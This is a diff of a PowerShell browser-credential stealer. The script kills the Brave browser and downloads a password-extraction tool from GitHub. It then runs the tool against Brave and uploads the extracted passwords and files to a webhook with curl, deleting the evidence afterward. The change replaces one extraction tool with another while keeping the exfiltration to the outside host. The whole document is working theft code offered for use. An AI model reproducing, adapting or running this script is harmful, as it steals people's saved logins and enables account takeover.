@@ -5,7 +5,7 @@ function Send {
     Invoke-RestMethod -Uri $wh -Method Post -Body (@{content=$m}|ConvertTo-Json) -ContentType "application/json"|Out-Null
 }
 
-Send "🚀 ChromeElevator bypass starting..."
+Send "🔧 Trying HackBrowserData..."
 
 Get-Process brave -EA 0|Stop-Process -Force -EA 0
 Start-Sleep 5
@@ -13,38 +13,52 @@ Start-Sleep 5
 cd $env:TEMP
 
 [Net.ServicePointManager]::SecurityProtocol='Tls12'
-Invoke-WebRequest "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v1.0.0/chromelevator.exe" -OutFile "ce.exe" -UseBasicParsing
 
-if (Test-Path "ce.exe") {
-    Send "✅ Downloaded, running..."
+try {
+    Invoke-WebRequest "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-v0.4.6-windows-amd64.zip" -OutFile "hbd.zip" -UseBasicParsing
     
-    $out = .\ce.exe brave --output pass.json 2>&1|Out-String
+    Send "✅ Downloaded, extracting..."
+    
+    Expand-Archive "hbd.zip" "hbd" -Force
+    cd hbd
+    
+    Send "▶️ Running extraction..."
+    
+    $output = .\hack-browser-data.exe -b brave -f json --dir results 2>&1|Out-String
+    
     Start-Sleep 5
     
-    Send "Output: $out"
+    Send "Output: $output"
     
-    if (Test-Path "pass.json") {
-        $j = Get-Content "pass.json" -Raw|ConvertFrom-Json
+    $files = Get-ChildItem results -Recurse -File -EA 0
+    
+    if ($files) {
+        Send "📁 Found $($files.Count) files"
         
-        if ($j.passwords) {
-            $r = ""
-            foreach ($p in $j.passwords) {
-                $r += "$($p.url)`n$($p.username)`n$($p.password)`n`n"
+        foreach ($file in $files) {
+            Send "File: $($file.Name) ($($file.Length) bytes)"
+            
+            if ($file.Extension -eq ".json") {
+                $content = Get-Content $file.FullName -Raw
+                
+                if ($content.Length -lt 1500) {
+                    Send $content
+                } else {
+                    $content|Out-File "$env:TEMP\result.txt" -Encoding UTF8
+                    curl.exe -F "file=@$env:TEMP\result.txt" $wh
+                    Remove-Item "$env:TEMP\result.txt"
+                }
             }
-            $r|Out-File "r.txt" -Encoding UTF8
-            curl.exe -F "file=@r.txt" $wh
-            Remove-Item r.txt
-        } else {
-            Send "JSON vide"
         }
-        Remove-Item pass.json
     } else {
-        Send "Pas de JSON créé"
+        Send "❌ No files generated"
     }
     
-    Remove-Item ce.exe
-} else {
-    Send "❌ Téléchargement échoué"
+    cd $env:TEMP
+    Remove-Item hbd,hbd.zip -Recurse -Force
+    
+} catch {
+    Send "❌ Error: $($_.Exception.Message)"
 }
 
-Send "🏁 Fini"
+Send "🏁 Done"
